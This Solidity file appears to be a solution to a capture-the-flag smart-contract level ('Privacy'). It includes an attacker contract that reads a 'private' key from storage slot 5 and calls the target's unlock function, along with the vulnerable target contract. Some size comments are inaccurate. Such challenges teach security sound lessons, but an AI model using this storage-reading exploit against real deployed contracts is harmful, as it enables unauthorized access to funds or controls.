pragma solidity ^0.6.0;


/*
Nothing is private on the blockchain:

1. Get the data from the slot number:
Ethereum stores data contguously in 32bytes. so, keeping values that
can fit int contguous 32bytes can save space
await web3.eth.getStorageAt(contract.address, 5, (e, v) => console.log(v));
*/

contract AttactPrivacy {
  Privacy target;
  
  
  constructor(address _targetAddress) public {
      target = Privacy(_targetAddress);
  }
  
  function unlock(bytes32 _slotValue) public {
      // cast bytes32 gotten from the slot valuue to bytes32. This splits it in half. i.e the last half
      bytes16 key = bytes16(_slotValue);
      target.unlock(key);
  }
    
}
// 0xb7067f69858ec900efac5e20e91ee5b8a73220f921987c52c7ab842e775f9f0c

// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

contract Privacy {
  // 1byte... Total=1byte...fits in slot 0
  bool public locked = true;
  // 32bytes... Total=32byte...fits in slot 1
  uint256 public ID = block.timestamp;
  // 8 bytes... Total+=8bytes = 8...fits in slot 2
  uint8 private flattening = 10;
  // 8 bytes... Total+=8bytes = 16...fits in slot 2
  uint8 private denomination = 255;
  // 16bytes... Total+=16bytes = 32...fits in slot 2
  uint16 private awkwardness = uint16(now);
  // 32*3 bytes... Total=1byte...fits in slot 3,4,5 (therefore data[2] is slot 5)
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    // data[2] is slot 5
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
